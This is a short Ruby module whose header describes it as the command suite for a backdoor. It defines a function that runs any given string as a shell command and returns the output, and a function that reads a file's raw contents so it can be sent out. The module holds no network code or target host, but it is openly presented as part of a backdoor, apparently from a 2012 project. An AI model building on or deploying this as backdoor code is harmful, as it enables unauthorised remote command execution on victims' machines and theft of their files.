#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# Commands
#
# Author: Karl Castillo
# Date: November 20, 2012
#
# Notes:
# Commands suite and helper comands for the backdoor.
#-------------------------------------------------------------------------------
module Commands
    #---------------------------------------------------------------------------
    # run_command
    #
    # Author: Karl Castillo
    # Date: November 20, 2012
    #
    # Notes:
    # Runs the command on the shell
    #---------------------------------------------------------------------------
    def run_command(cmd)
        begin
            return `#{cmd}`
        rescue Exception => e
            return e.to_s
        end # rescue
    end
    
    #---------------------------------------------------------------------------
    # listen
    #
    # Author: Karl Castillo
    # Date: November 20, 2012
    #
    # Notes:
    # Open and read the file that will be sent
    #---------------------------------------------------------------------------
    def get_command(filename)
        if !File.exist?(filename) then
            return "File: " + filename + " does not exist."
        end
        file = File.open(filename, "rb")
        return file.read
    end
end
